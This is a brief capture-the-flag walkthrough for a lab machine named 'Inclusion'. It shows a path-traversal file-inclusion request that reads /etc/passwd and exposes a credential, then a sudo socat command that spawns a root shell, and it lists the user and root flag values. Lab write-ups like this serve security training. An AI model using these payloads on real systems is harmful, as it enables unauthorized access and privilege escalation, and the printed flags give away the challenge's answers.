# INCLUSION

## BASIC INFO
```
export IP=10.10.65.76
```

## ROOT IT

> - **user flag**
>> 60989655118397345799

LFI on the webpage. Navigate to `$IP/?page=../../../../../ect/passwd`
```
#falconfeast:rootpassword
```

> - **root flag**
>> 42964104845495153909

`sudo -l` to see what command we can run. Seems like `socat` it is.
```
socat stdin exec:/bin/sh
```
